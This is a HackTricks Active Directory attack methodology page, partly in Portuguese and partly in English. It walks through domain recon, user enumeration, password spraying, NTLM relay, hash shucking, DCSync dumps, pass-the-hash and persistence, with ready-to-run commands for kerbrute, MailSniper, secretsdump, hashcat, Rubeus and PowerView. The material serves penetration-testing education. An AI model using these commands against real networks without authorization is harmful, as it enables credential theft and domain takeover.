# Metodologia de Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

**Active Directory** serve como uma tecnologia fundamental, permitindo que **administradores de rede** criem e gerenciem com eficiência **domains**, **users** e **objects** em uma rede. Ele foi projetado para escalar, facilitando a organização de um grande número de usuários em **groups** e **subgroups** gerenciáveis, enquanto controla **access rights** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domains**, **trees** e **forests**. Um **domain** abrange uma coleção de objetos, como **users** ou **devices**, compartilhando um banco de dados comum. **Trees** são grupos desses domains ligados por uma estrutura compartilhada, e uma **forest** representa a coleção de múltiplas trees, interconectadas por **trust relationships**, formando a camada mais alta da estrutura organizacional. **Access** e **communication rights** específicos podem ser definidos em cada um desses níveis.

Os conceitos-chave dentro do **Active Directory** incluem:

1. **Directory** – Armazena todas as informações relacionadas aos objetos do Active Directory.
2. **Object** – Denota entidades dentro do directory, incluindo **users**, **groups** ou **shared folders**.
3. **Domain** – Serve como um contêiner para objetos do directory, com a capacidade de vários domains coexistirem em uma **forest**, cada um mantendo sua própria coleção de objetos.
4. **Tree** – Um agrupamento de domains que compartilham um domain raiz comum.
5. **Forest** – O ápice da estrutura organizacional no Active Directory, composto por várias trees com **trust relationships** entre elas.

**Active Directory Domain Services (AD DS)** abrange uma variedade de serviços críticos para o gerenciamento centralizado e a comunicação dentro de uma rede. Esses serviços incluem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia interações entre **users** e **domains**, incluindo funcionalidades de **authentication** e **search**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gerenciamento de **digital certificates** seguros.
3. **Lightweight Directory Services** – Dá suporte a aplicações habilitadas para directory por meio do **LDAP protocol**.
4. **Directory Federation Services** – Fornece capacidades de **single-sign-on** para autenticar usuários em várias aplicações web em uma única sessão.
5. **Rights Management** – Ajuda a proteger material protegido por direitos autorais, regulando sua distribuição e uso não autorizados.
6. **DNS Service** – Crucial para a resolução de **domain names**.

Para uma explicação mais detalhada, confira: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender como **attack an AD** você precisa **understand** muito bem o **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Você pode consultar bastante coisa em [https://wadcoms.github.io/](https://wadcoms.github.io) para ter uma visão rápida de quais comandos você pode executar para enumerar/explorar um AD.

> [!WARNING]
> A comunicação Kerberos **requires a full qualifid name (FQDN)** para realizar ações. Se você tentar acessar uma máquina pelo endereço IP, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Se você apenas tem acesso a um ambiente AD, mas não possui credenciais/sessões, você poderia:

- **Pentest the network:**
- Escanear a rede, encontrar máquinas e portas abertas e tentar **exploit vulnerabilities** ou **extract credentials** delas (por exemplo, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerar DNS pode fornecer informações sobre servidores-chave no domain, como web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dê uma olhada na [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) geral para encontrar mais informações sobre como fazer isso.
- **Check for null and Guest access on smb services** (isso não funciona em versões modernas do Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Coletar credenciais [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acessar host explorando [**the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Coletar credenciais **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrair usernames/nomes de documentos internos, mídias sociais, serviços (principalmente web) dentro dos ambientes do domain e também das fontes publicamente disponíveis.
- Se você encontrar os nomes completos dos funcionários da empresa, pode tentar diferentes convenções de **username** do AD (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Confira as páginas [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando um **invalid username is requested** o servidor responderá usando o código de erro **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo determinar que o username era inválido. **Valid usernames** irão retornar ou o **TGT in a AS-REP** ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário precisa realizar pré-autenticação.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra a interface MS-NRPC (Netlogon) em domain controllers. O método chama a função `DsrGetDcNameEx2` após vincular a interface MS-NRPC para verificar se o usuário ou computer existe sem nenhuma credencial. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [aqui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se você encontrou um desses servidores na rede, também pode realizar **enumeração de usuários** contra ele. Por exemplo, você pode usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Você pode encontrar listas de nomes de usuário em [**este github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e este ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter o **nome das pessoas que trabalham na empresa** a partir da etapa de recon que você deveria ter realizado antes disso. Com o nome e sobrenome, você poderia usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar possíveis usernames válidos.

### Knowing one or several usernames

Ok, então você já sabe que tem um username válido, mas nenhuma senha... Então tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tiver** o atributo _DONT_REQ_PREAUTH_, você pode **solicitar uma mensagem AS_REP** para esse usuário que conterá alguns dados criptografados por uma derivação da senha do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as senhas mais **comuns** com cada um dos users descobertos, talvez algum user esteja usando uma senha fraca (lembre-se da password policy!).
- Note que você também pode **spray OWA servers** para tentar obter acesso aos mail servers dos usuários.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você pode ser capaz de **obter** alguns challenge **hashes** para quebrar **poisoning** alguns protocolos da **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se você conseguiu enumerar o active directory, você terá **mais emails e uma melhor compreensão da network**. Você pode ser capaz de forçar **relay attacks** de NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obter acesso ao ambiente AD.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** para manter o estado da recon do AD por engagement: `workspace create <name>` cria SQLite DBs por protocolo em `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Alterne as views com `proto smb|mssql|winrm` e liste os secrets coletados com `creds`. Apague manualmente os dados sensíveis quando terminar: `rm -rf ~/.nxc/workspaces/<name>`.
- Descoberta rápida de subnet com **`netexec smb <cidr>`** mostra **domain**, **OS build**, **SMB signing requirements** e **Null Auth**. Membros mostrando `(signing:False)` são **relay-prone**, enquanto DCs geralmente exigem signing.
- Gere **hostnames em /etc/hosts** diretamente da saída do NetExec para facilitar o targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando o **SMB relay para o DC está bloqueado** por signing, ainda verifique a postura de **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / channel binding fraco. Um DC com SMB signing obrigatório, mas LDAP signing desativado, continua sendo um alvo viável de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Vazamentos de credenciais de impressoras no lado do cliente → validação em massa de credenciais de domínio

- Interfaces web/impressoras às vezes **incorporam senhas de admin mascaradas em HTML**. Ver o código-fonte/devtools pode revelar o texto puro (por exemplo, `<input value="<password>">`), permitindo acesso por Basic-auth para varrer/imprimir repositórios.
- Trabalhos de impressão recuperados podem conter **documentos de onboarding em texto puro** com senhas por usuário. Mantenha os pareamentos alinhados ao testar:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Roubar Creds NTLM

Se você conseguir **acessar outros PCs ou shares** com o usuário **null ou guest**, você pode **colocar arquivos** (como um arquivo SCF) que, se forem acessados, irão **disparar uma autenticação NTLM contra você** para que você possa **roubar** o **NTLM challenge** e quebrá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada NT hash que você já possui como uma senha candidata para outros formatos mais lentos cujo material de chave é derivado diretamente do NT hash. Em vez de brute-forcing longas passphrases em tickets Kerberos RC4, desafios NetNTLM ou credenciais em cache, você alimenta os NT hashes nos modos NT-candidate do Hashcat e deixa que ele valide a reutilização de senha sem nunca aprender o plaintext. Isso é especialmente potente após um domain compromise, quando você pode coletar milhares de NT hashes atuais e históricos.

Use shucking quando:

- Você tem um corpus NT de DCSync, dumps SAM/SECURITY ou credential vaults e precisa testar reutilização em outros domains/forests.
- Você captura material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM ou blobs DCC/DCC2.
- Você quer provar rapidamente reutilização para longas passphrases impossíveis de quebrar e pivotar imediatamente via Pass-the-Hash.

A técnica **não funciona** contra tipos de criptografia cujas chaves não são o NT hash (por exemplo, Kerberos etype 17/18 AES). Se um domain impõe apenas AES, você precisa voltar aos modos normais de password.

#### Construindo um corpus de NT hashes

- **DCSync/NTDS** – Use `secretsdump.py` com history para obter o maior conjunto possível de NT hashes (e seus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Entradas de history aumentam muito o pool de candidatos porque a Microsoft pode armazenar até 24 hashes anteriores por conta. Para mais formas de coletar secrets do NTDS veja:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados locais do SAM/SECURITY e logons de domínio em cache (DCC/DCC2). Remova duplicados e adicione esses hashes à mesma lista `nt_candidates.txt`.
- **Track metadata** – Guarde o username/domain que gerou cada hash (mesmo que a wordlist tenha só hex). Hashes correspondentes mostram imediatamente qual principal está reutilizando uma senha quando o Hashcat imprimir o candidate vencedor.
- Prefira candidatos do mesmo forest ou de um trusted forest; isso maximiza a chance de sobreposição ao shucking.

#### Modos NT-candidate do Hashcat

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- Inputs NT-candidate **devem permanecer como NT hashes brutos de 32 hex**. Desative rule engines (sem `-r`, sem modos híbridos) porque alterar o formato corrompe o material de chave candidato.
- Esses modos não são inerentemente mais rápidos, mas o keyspace NTLM (~30,000 MH/s em um M3 Max) é ~100× mais rápido que Kerberos RC4 (~300 MH/s). Testar uma lista NT curada é muito mais barato do que explorar todo o espaço de senhas no formato lento.
- Sempre execute a **build mais recente do Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque os modos 31500/31600/35300/35400 foram lançados recentemente.
- No momento não existe modo NT para AS-REQ Pre-Auth, e etypes AES (19600/19700) exigem a plaintext password porque suas chaves são derivadas via PBKDF2 de passwords UTF-16LE, não de NT hashes brutos.

#### Exemplo – Kerberoast RC4 (modo 35300)

1. Capture um TGS RC4 para um SPN alvo com um usuário de baixo privilégio (veja a página Kerberoast para detalhes):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Faça shuck do ticket com sua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

O Hashcat deriva a chave RC4 de cada NT candidate e valida o blob `$krb5tgs$23$...`. Um match confirma que a service account usa um dos seus NT hashes existentes.

3. Faça pivot imediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente, você pode recuperar a plaintext depois com `hashcat -m 1000 <matched_hash> wordlists/` se necessário.

#### Exemplo – Credenciais em cache (modo 31600)

1. Faça dump dos logons em cache de uma workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copie a linha DCC2 do usuário de domínio interessante para `dcc2_highpriv.txt` e faça shuck dela:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Um match bem-sucedido fornece o NT hash já conhecido na sua lista, provando que o usuário em cache está reutilizando uma senha. Use-o diretamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-force-o em modo NTLM rápido para recuperar a string.

O mesmo fluxo exato se aplica a respostas NetNTLM (`-m 27000/27100`) e DCC (`-m 31500`). Assim que um match for identificado, você pode iniciar relay, SMB/WMI/WinRM PtH, ou re-crackear o NT hash com masks/rules offline.



## Enumerando Active Directory COM credenciais/session

Para esta fase você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tem algumas credenciais válidas ou um shell como usuário de domínio, **deve lembrar que as opções dadas antes ainda são opções para comprometer outros usuários**.

Antes de começar a enumeração autenticada, você deve saber o que é o **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeração

Ter comprometido uma conta é um **grande passo para começar a comprometer todo o domain**, porque você vai poder iniciar a **Active Directory Enumeration:**

Em relação ao [**ASREPRoast**](asreproast.md), agora você pode encontrar todos os usuários possivelmente vulneráveis e, em relação ao [**Password Spraying**](password-spraying.md), você pode obter uma **lista de todos os usernames** e testar a password da conta comprometida, passwords vazias e novas passwords promissoras.

- Você pode usar o [**CMD para realizar uma recon básica**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar [**powershell para recon**](../basic-powershell-for-pentesters/index.html), que será mais stealthier
- Você também pode [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
- Outra ferramenta incrível para recon em um active directory é [**BloodHound**](bloodhound.md). Ela **não é muito stealthy** (dependendo dos métodos de coleta que você usar), mas **se você não se importar** com isso, definitivamente deveria testá-la. Encontre onde os users podem RDP, encontre paths para outros groups, etc.
- **Outras ferramentas automatizadas de enumeração AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records do AD**](ad-dns-records.md), pois eles podem conter informações interessantes.
- Uma **ferramenta com GUI** que você pode usar para enumerar o directory é **AdExplorer.exe** da suíte **SysInternal**.
- Você também pode pesquisar no banco de dados LDAP com **ldapsearch** para procurar credentials nos campos _userPassword_ e _unixUserPassword_, ou até mesmo em _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
- Se você estiver usando **Linux**, também pode enumerar o domain usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também pode tentar ferramentas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraindo todos os usuários do domain**

É muito fácil obter todos os usernames do domain a partir do Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de Enumeration pareça pequena, ela é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda a enumerar um domain e pratique até se sentir confortável. Durante uma assessment, este será o momento-chave para encontrar seu caminho até DA ou decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **TGS tickets** usados por services ligados a user accounts e quebrar sua criptografia — que é baseada em user passwords — **offline**.

Mais sobre isso em:


{{#ref}}
kerberoast.md
{{#endref}}

### Conexão remota (RDP, SSH, FTP, Win-RM, etc)

Assim que você obtiver algumas credentials, você pode verificar se tem acesso a alguma **máquina**. Para isso, você pode usar **CrackMapExec** para tentar conectar em vários servers com diferentes protocols, de acordo com seus port scans.

### Escalada local de privilégios

Se você comprometeu credentials ou uma sessão como um regular domain user e tem **access** com esse usuário a **qualquer máquina no domain**, você deve tentar encontrar uma forma de **escalar privilégios localmente e coletar credentials**. Isso ocorre porque apenas com local administrator privileges você conseguirá **dump hashes de outros users** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e uma [**checklist**](../checklist-windows-privilege-escalation.md). Além disso, não se esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets da sessão atual

É muito **improvável** que você encontre **tickets** no current user **dando permissão para acessar** recursos inesperados, mas você pode verificar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se você conseguiu enumerar o active directory, você terá **mais emails e uma melhor compreensão da rede**. Você pode conseguir forçar **relay attacks** do NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Agora que você tem algumas credenciais básicas, deve verificar se consegue **encontrar** quaisquer **arquivos interessantes sendo compartilhados dentro do AD**. Você poderia fazer isso manualmente, mas é uma tarefa repetitiva e muito entediante (e ainda mais se encontrar centenas de docs que precisa verificar).

[**Siga este link para aprender sobre tools que você pode usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se você conseguir **acessar outros PCs ou shares**, você poderia **colocar arquivos** (como um arquivo SCF) que, se acessados de alguma forma, farão t**rigger uma autenticação NTLM contra você** para que você possa **roubar** o **desafio NTLM** e crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para as seguintes técnicas, um usuário comum do domain não é suficiente; você precisa de alguns privilégios/credentials especiais para realizar esses attacks.**

### Hash extraction

Com sorte, você conseguiu **comprometer alguma conta de local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Então, é hora de dump all the hashes em memória e localmente.\
[**Leia esta página sobre diferentes formas de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Uma vez que você tenha o hash de um usuário**, você pode usá-lo para **personificá-lo**.\
Você precisa usar alguma **tool** que **realize** a **autenticação NTLM usando** esse **hash**, **ou** poderia criar uma nova **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, para que, quando qualquer **autenticação NTLM for realizada**, **esse hash seja usado.** A última opção é o que o mimikatz faz.\
[**Leia esta página para mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este attack tem como objetivo **usar o hash NTLM do usuário para solicitar tickets Kerberos**, como uma alternativa ao comum Pass The Hash sobre o protocolo NTLM. Portanto, isso pode ser especialmente **útil em networks onde o protocolo NTLM está desativado** e somente **Kerberos é permitido** como protocolo de autenticação.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de attack **Pass The Ticket (PTT)**, attackers **roubam o ticket de autenticação de um usuário** em vez da senha ou dos valores de hash. Esse ticket roubado é então usado para **personificar o usuário**, obtendo acesso não autorizado a resources e services dentro de uma network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se você tiver o **hash** ou a **password** de um **local administrator**, você deve tentar **fazer login localmente** em outros **PCs** com isso.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **ruidoso** and **LAPS** would **mitigate** it.

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Discovering a **Spool service listening** within the domain can be **abused** to **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

If **other users** **access** the **compromised** machine, it's possible to **gather credentials from memory** and even **inject beacons in their processes** to impersonate them.\
Usually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** provides a system for managing the **local Administrator password** on domain-joined computers, ensuring it's **randomized**, unique, and frequently **changed**. These passwords are stored in Active Directory and access is controlled through ACLs to authorized users only. With sufficient permissions to access these passwords, pivoting to other computers becomes possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** from the compromised machine could be a way to escalate privileges inside the environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

If **vulnerable templates** are configured it's possible to abuse them to escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is a very good way to be able to persist in the users account (even if he changes the password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object in Active Directory ensures the security of **privileged groups** (like Domain Admins and Enterprise Admins) by applying a standard **Access Control List (ACL)** across these groups to prevent unauthorized changes. However, this feature can be exploited; if an attacker modifies the AdminSDHolder's ACL to give full access to a regular user, that user gains extensive control over all privileged groups. This security measure, meant to protect, can thus backfire, allowing unwarranted access unless closely monitored.

